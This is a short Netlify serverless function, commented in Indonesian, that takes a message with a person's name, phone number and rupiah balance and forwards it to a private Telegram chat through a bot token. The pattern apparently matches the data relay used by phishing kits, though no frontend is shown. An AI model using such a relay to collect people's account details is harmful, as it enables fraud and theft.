// Netlify Function untuk mengirim data ke Telegram
// File ini harus diletakkan di: netlify/functions/send-data.js

const fetch = require('node-fetch');

exports.handler = async (event, context) => {
    // CORS headers agar bisa diakses dari frontend
    const headers = {
        'Access-Control-Allow-Origin': '*',
        'Access-Control-Allow-Headers': 'Content-Type',
        'Access-Control-Allow-Methods': 'POST, OPTIONS',
        'Content-Type': 'application/json'
    };
    
    // Handle preflight request
    if (event.httpMethod === 'OPTIONS') {
        return { statusCode: 204, headers, body: '' };
    }
    
    // Hanya menerima method POST
    if (event.httpMethod !== 'POST') {
        return {
            statusCode: 405,
            headers,
            body: JSON.stringify({ error: 'Method not allowed' })
        };
    }
    
    try {
        // Ambil data dari request body
        const { message, nama, nomor, saldo, timestamp } = JSON.parse(event.body);
        
        if (!message) {
            return {
                statusCode: 400,
                headers,
                body: JSON.stringify({ error: 'Message is required' })
            };
        }
        
        // Ambil konfigurasi dari Environment Variables Netlify
        const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
        const CHAT_ID = process.env.TELEGRAM_CHAT_ID;
        
        // Validasi konfigurasi
        if (!BOT_TOKEN || !CHAT_ID) {
            console.error('Missing Telegram configuration');
            return {
                statusCode: 500,
                headers,
                body: JSON.stringify({ 
                    error: 'Telegram bot not configured',
                    message: 'Please set TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID in Netlify environment variables'
                })
            };
        }
        
        // Kirim ke Telegram API
        const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
        
        const response = await fetch(telegramUrl, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: message,
                parse_mode: 'HTML'
            })
        });
        
        const result = await response.json();
        
        if (result.ok) {
            console.log(`✅ [${new Date().toISOString()}] Pesan terkirim: ${nama} | ${nomor} | Rp ${saldo}`);
            return {
                statusCode: 200,
                headers,
                body: JSON.stringify({ 
                    success: true, 
                    message: 'Data berhasil dikirim ke Telegram',
                    data: { nama, nomor, saldo, timestamp }
                })
            };
        } else {
            console.error('Telegram API Error:', result.description);
            return {
                statusCode: 500,
                headers,
                body: JSON.stringify({ 
                    error: 'Failed to send message to Telegram',
                    details: result.description
                })
            };
        }
        
    } catch (error) {
        console.error('Function Error:', error);
        return {
            statusCode: 500,
            headers,
            body: JSON.stringify({ 
                error: 'Internal server error',
                details: error.message
            })
        };
    }
};
